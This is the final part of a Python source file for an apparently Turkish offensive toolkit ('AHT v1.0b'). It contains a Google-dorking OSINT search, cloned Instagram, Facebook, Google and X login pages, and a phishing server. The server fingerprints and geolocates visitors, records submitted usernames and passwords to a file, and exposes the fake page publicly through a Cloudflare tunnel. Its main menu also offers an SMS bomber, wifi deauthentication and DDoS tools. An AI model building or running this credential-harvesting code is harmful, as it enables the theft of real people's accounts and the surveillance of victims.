                if href.startswith("/url?q="):
                    href = href.split("&")[0].replace("/url?q=", "")
                if href.startswith("http"):
                    sonuclar.append((h3.get_text(strip=True), href))
        if not sonuclar:
            for a in soup.select("a[href^='http']"):
                h3 = a.select_one("h3")
                if h3 and a["href"].startswith("http"):
                    sonuclar.append((h3.get_text(strip=True), a["href"]))
        if not sonuclar:
            for a in soup.find_all("a", href=True):
                h3 = a.find("h3")
                if h3 and a["href"].startswith("http") and "google" not in a["href"]:
                    sonuclar.append((h3.get_text(strip=True), a["href"]))
        if not sonuclar:
            fail(_("profil_yok"))
            input(f"  {Y}{_('enter')}{S} "); return
        sonuclar = sonuclar[:limit]
        for i, (ba, li) in enumerate(sonuclar, 1):
            print(f"  {ba}")
            print(f"  {li}\n")
        ok(f"{len(sonuclar)} {_('sonuc_sayisi')}")
        if soru(f"  {_('kaydet_sor')} (E/h)", "E").strip().lower() in ("", "e", "evet", "y", "yes"):
                ts = time.strftime("%Y%m%d_%H%M%S")
                dosya = f"osint-dork-{ts}.txt"
                with open(dosya, "w", encoding="utf-8") as f:
                    f.write(f"Dork: {dork}\nTarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n{'-'*50}\n")
                    for bas, link in sonuclar:
                        f.write(f"{bas}\n{link}\n\n")
                ok(_("kaydedildi").format(dosya=dosya))
    except:
        fail(_("hata"))
    input(f"  {Y}{_('enter')}{S} ")

def osint_menu():
    global LANG
    while True:
        baslik(_("osint_baslik"))
        menu_items = [("1", _("sherlock")), ("2", _("web_ara")), ("3", _("telefon_osint")),
                      ("4", _("google_dorking")), ("0", _("onceki"))]
        secim = secim_menu(menu_items)
        if secim.upper() == "L":
            LANG = "EN" if LANG == "TR" else "TR"; continue
        if secim == "1": sherlock_ara()
        elif secim == "2": web_ara()
        elif secim == "3": telefon_osint()
        elif secim == "4": google_dorking()
        elif secim == "0": return "Home"

# --| Phishing |-- #
FAKE_PAGES = {
    "1": ("Instagram", _("instagram_fake"),
"""<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh}
.login-box{background:#fff;border:1px solid #dbdbdb;padding:40px;text-align:center;width:350px}
.logo{font-size:36px;font-weight:600;margin-bottom:20px;color:#262626}
input{width:100%;padding:9px;margin:4px 0;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px}
button{width:100%;padding:7px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
button:hover{background:#1877f2}</style></head><body>
<div class="login-box"><div class="logo">Instagram</div>
<form method="POST" action="/">"""),

    "2": ("Facebook", _("facebook_fake"),
"""<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
.login-box{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:396px;text-align:center}
.logo{color:#1877f2;font-size:48px;font-weight:700;margin-bottom:10px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
button:hover{background:#166fe5}</style></head><body>
<div class="login-box"><div class="logo">facebook</div>
<form method="POST" action="/">"""),

    "3": ("Google", _("google_fake"),
"""<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Hesabinda Oturum Ac</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#fff}
.login-box{width:450px;padding:48px 40px 36px;text-align:center}
.logo{margin-bottom:20px}h2{font-size:24px;margin-bottom:8px;font-weight:400}
p{color:#5f6368;font-size:14px;margin-bottom:30px}
input{width:100%;padding:13px;margin:4px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}
input:focus{border-color:#1a73e8}button{width:100%;padding:9px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;margin-top:20px}
button:hover{background:#1765cc}</style></head><body>
<div class="login-box"><div class="logo"><svg width="75" height="24" viewBox="0 0 75 24"><path fill="#4285F4" d="M8.5 0h7.7v24H8.5z"/><text x="30" y="18" font-size="20" font-family="Arial" font-weight="bold" fill="#5f6368">Google</text></svg></div>
<h2>Oturum ac</h2><p>Hesabinizi kullanin</p>
<form method="POST" action="/">"""),

    "4": ("Twitter/X", _("twitter_fake"),
"""<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>X / Giris yap</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff}
.login-box{width:364px;padding:32px;text-align:center}
.logo{font-size:32px;margin-bottom:28px}h2{font-size:23px;font-weight:700;margin-bottom:20px}
input{width:100%;padding:12px;margin:4px 0;border:1px solid #333;border-radius:4px;font-size:15px;background:transparent;color:#fff;outline:none}
input:focus{border-color:#1d9bf0}button{width:100%;padding:12px;background:#fff;color:#000;border:none;border-radius:30px;font-size:15px;font-weight:700;cursor:pointer;margin-top:16px}
button:hover{background:#e6e6e6}</style></head><body>
<div class="login-box"><div class="logo">&#120143;</div><h2>Giris yap</h2>
<form method="POST" action="/">"""),
}

def fake_page_olustur():
    global _son_sayfa
    baslik(_("saf_page_olustur"))
    menu_items = [(k, f"{v[0]} - {v[1]}") for k, v in FAKE_PAGES.items()]
    menu_items.append(("0", _("onceki")))
    secim = secim_menu(menu_items)
    if secim == "0" or secim not in FAKE_PAGES: return
    ad, __, html = FAKE_PAGES[secim]
    html += '<input type="text" name="kullanici" placeholder="Kullanıcı Adı / E-posta / Telefon" required><br>'
    html += '<input type="password" name="sifre" placeholder="Şifre" required><br>'
    html += '<button type="submit">Giriş Yap</button></form></div></body></html>'
    os.makedirs("sites", exist_ok=True)
    dosya = f"sites/{ad.lower().replace('/','_').replace(' ','_')}.html"
    with open(dosya, "w", encoding="utf-8") as f:
        f.write(html)
    ok(_("saf_page_kaydedildi").format(dosya=dosya))
    _son_sayfa = dosya

def phishing_server():
    baslik(_("phishing_server"))
    global _son_sayfa
    if not _son_sayfa:
        fail(_("sayfa_yok"))
        input(f"  {Y}{_('enter')}{S} "); return
    port = soru(_("port_bilgi"), "8080")
    if not port: return
    try: port = int(port)
    except: port = 8080
    cf = input(f"  {W}{_('cloudflare_sor')}{S} {Y}(E/h):{S} ").strip().lower()
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import urllib.parse
    os.makedirs("sites", exist_ok=True)
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def vizitor_kaydet(self, ekstra=""):
            ip = self.client_address[0]
            ua = self.headers.get("User-Agent", "?")
            info(f"  {_('vizitor_bilgi')}")
            ok(_("ip_adres").format(ip=ip))
            ok(_("tarayici_bilgi").format(ua=ua[:80]))
            try:
                geo = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp", timeout=3).json()
                if geo.get("country"):
                    ok(_("ulke_bilgi").format(ulke=geo.get("country","?")))
                    ok(_("sehir_bilgi").format(sehir=geo.get("city","?")))
                if geo.get("isp"):
                    ok(_("isp_bilgi").format(isp=geo.get("isp","?")))
            except: pass
            if ekstra:
                info(ekstra[:120])
            ts = time.strftime("%Y%m%d_%H%M%S")
            with open("phishing_kayitlar.txt", "a", encoding="utf-8") as f:
                f.write(f"[{ts}] {_('vizitor_bilgi')}: {ip} | {ua}\n")
                for h, v in self.headers.items():
                    f.write(f"  {h}: {v}\n")
                if ekstra:
                    f.write(f"  {ekstra}\n")
                f.write("\n")
        def do_GET(self):
            if self.path.startswith("/track"):
                q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
                ekstra = "; ".join(f"{k}={v[0]}" for k, v in q.items())
                self.vizitor_kaydet(ekstra)
                self.send_response(200)
                self.end_headers()
                return
            self.vizitor_kaydet()
            try:
                with open(_son_sayfa, "rb") as f:
                    data = f.read()
                js = b"""<script>
fetch('/track?'+new URLSearchParams({
  ekran:screen.width+'x'+screen.height,
  dil:navigator.language,
  platform:navigator.platform,
  zaman:Intl.DateTimeFormat().resolvedOptions().timeZone
}));
</script>"""
                data = data.replace(b"</head>", js + b"</head>")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(data)
            except:
                self.send_error(404)
        def do_POST(self):
            self.vizitor_kaydet()
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8")
                params = urllib.parse.parse_qs(body)
                k = params.get("kullanici", [""])[0]
                s = params.get("sifre", [""])[0]
                ok(_("kullanici_ekle").format(k=k, s=s))
                ts = time.strftime("%Y%m%d_%H%M%S")
                with open("phishing_kayitlar.txt", "a", encoding="utf-8") as f:
                    f.write(f"[{ts}] {_('kullanici_ekle').format(k=k, s=s)}\n\n")
            except: pass
            self.send_response(302)
            self.send_header("Location", "https://www.google.com")
            self.end_headers()
    try:
        server = HTTPServer(("0.0.0.0", port), Handler)
        ok(f"{_('server_basladi')}: http://0.0.0.0:{port}/")
        cf_proc = None
        if cf in ("", "e", "evet", "y", "yes"):
            cf_bin = "cloudflared.exe" if OS == "Windows" else "cloudflared"
            import shutil
            cf_path = shutil.which(cf_bin)
            if not cf_path:
                info(_("cf_bulunamadi"))
                info(_("cf_indir"))
                try:
                    cf_url = ("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
                              if OS == "Windows" else
                              "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64")
                    r = requests.get(cf_url, timeout=30)
                    if r.status_code == 200:
                        cf_path = os.path.abspath(cf_bin)
                        with open(cf_path, "wb") as f:
                            f.write(r.content)
                        if OS != "Windows":
                            os.chmod(cf_path, 0o755)
                        ok(f"cloudflared -> {cf_path}")
                    else:
                        fail(_("cf_indir_hata"))
                except:
                    fail(_("cf_indir_hata"))
            if cf_path and os.path.exists(cf_path):
                ok(_("cf_basladi"))
                cf_proc = subprocess.Popen(
                    [cf_path, "tunnel", "--url", f"http://localhost:{port}"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if OS == "Windows" else 0)
                import threading
                def cf_oku():
                    for line in cf_proc.stdout:
                        if "trycloudflare.com" in line:
                            idx = line.find("https://")
                            url = line[idx:].split()[0] if idx >= 0 else ""
                            if url:
                                ok(_("public_url").format(url=url))
                                print()
                threading.Thread(target=cf_oku, daemon=True).start()
            else:
                fail(_("cf_indir_hata"))
        ok(_("durdurur"))
        server.serve_forever()
    except OSError:
        fail(_("port_kullaniliyor").format(p=port))
    except KeyboardInterrupt:
        if cf_proc: cf_proc.terminate()
        server.server_close()
        ok(_("durduruldu_server"))
    input(f"  {Y}{_('enter')}{S} ")

_son_sayfa = ""

def phishing_menu():
    while True:
        baslik(_("phishing_baslik"))
        menu_items = [("1", _("saf_page_olustur")), ("2", _("phishing_server")), ("0", _("onceki"))]
        secim = secim_menu(menu_items)
        if secim.upper() == "L":
            LANG = "EN" if LANG == "TR" else "TR"; continue
        if secim == "1": fake_page_olustur()
        elif secim == "2": phishing_server()
        elif secim == "0": return "Home"

# --| Bagimlilik Kontrolu |-- #
def bagimlilik_kontrol():
    eksik = []
    for modul, pip_ad in [("scapy","scapy"), ("colorama","colorama"), ("requests","requests"),
                          ("bs4","beautifulsoup4")]:
        try:
            __import__(modul)
        except ImportError:
            eksik.append(pip_ad)
    if eksik:
        print(f"{Y}  Eksik paketler:{S} {', '.join(eksik)}")
        r = input(f"  {Y}Otomatik kurulsun mu?{S} (E/h): ").strip().lower()
        if r in ("", "e", "evet", "y", "yes"):
            for p in eksik:
                info(f"{p} kuruluyor...")
                subprocess.run([sys.executable, "-m", "pip", "install", p], capture_output=True)
            ok("Paketler kuruldu.")
    if OS == "Windows":
        import ctypes
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall") as k:
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        n = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        v = winreg.QueryValueEx(n, "DisplayName")[0]
                        if "Npcap" in v:
                            return
                    except:
                        pass
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall") as k:
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        n = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        v = winreg.QueryValueEx(n, "DisplayName")[0]
                        if "Npcap" in v:
                            return
                    except:
                        pass
        except:
            pass
        warn("Npcap bulunamadi! Bazi ag islemleri calismayabilir.")
        info("install.bat dosyasini YONETICI olarak calistirin:")
        info("  install.bat'i Yonetici olarak calistirin:")
        info("  Sag tik -> Yonetici olarak calistir\n")

bagimlilik_kontrol()

# --| Ana Menu |-- #
while True:
    clear_screen()
    if Location == "Home":
        if kucuk_ekran():
            print(f"""  {W}+------------------------------------+{S}
  {W}|       AHT v1.0b - Alperen Buba     |{S}
  {W}+------------------------------------+{S}
""")
        else:
            print(W + """
     █████╗ ██╗  ██╗████████╗
    ██╔══██╗██║  ██║╚══██╔══╝
    ███████║███████║   ██║   
    ██╔══██║██╔══██║   ██║   
    ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   """ + S + f"""
    {W}  version 1.0b - Alperen Buba{S}
""")
        durum_cubugu()
        secim = secim_menu([
            ("1",_("sms_bomber")), ("2",_("wifi_deauth")), ("3",_("network_tools")),
            ("4",_("ip_geo")), ("5",_("port_scanner")), ("6",_("mac_changer")),
            ("7",_("ddos")), ("8",_("osint")), ("9",_("phishing")),
            ("L",_("dil_degistir")), ("0",_("cikis")),
        ])
        if secim.upper() == "L":
            LANG = "EN" if LANG == "TR" else "TR"
            continue
        match secim:
            case "1": Location = "sms_bomber"
            case "2": Location = "wifi_deauth"
            case "3": Location = "bettercap"
            case "4": Location = "ip_geolocation"
            case "5": Location = "port_scanner"
            case "6": Location = "mac_changer"
            case "7": Location = "ddos_tool"
            case "8": Location = "osint_menu"
            case "9": Location = "phishing"
            case "0": clear_screen(); sys.exit(0)
            case _: input(f"  {R}{_('gecersiz')}{S} {Y}{_('enter')}{S} ")

    elif Location == "sms_bomber": Location = sms_bomber()
    elif Location == "wifi_deauth": Location = wifi_deauth()
    elif Location == "bettercap": Location = bettercap_menu()
    elif Location == "ip_geolocation": Location = ip_geolocation()
    elif Location == "port_scanner": Location = port_scanner()
    elif Location == "mac_changer": Location = mac_changer()
    elif Location == "ddos_tool": Location = ddos_tool()
    elif Location == "osint_menu": Location = osint_menu()
    elif Location == "phishing": Location = phishing_menu()
